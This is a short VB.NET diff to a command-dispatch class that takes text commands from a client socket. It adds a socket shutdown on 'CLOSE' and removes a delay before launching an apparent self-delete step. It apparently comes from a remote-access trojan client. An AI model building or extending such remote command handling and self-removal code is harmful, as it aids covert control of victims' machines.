@@ -9,6 +9,12 @@ Public Class Messages
             Select Case A(0)
 
                 Case "CLOSE"
+                    Try
+                        ClientSocket.S.Shutdown(Net.Sockets.SocketShutdown.Both)
+                        ClientSocket.S.Close()
+                    Catch ex As Exception
+                    End Try
+
                     Environment.Exit(0)
 
                 Case "DW"
@@ -58,7 +64,6 @@ Public Class Messages
             Catch ex As Exception
             End Try
 
-            Threading.Thread.Sleep(1)
             Diagnostics.Process.Start(Del)
             Environment.Exit(0)
         Catch ex As Exception
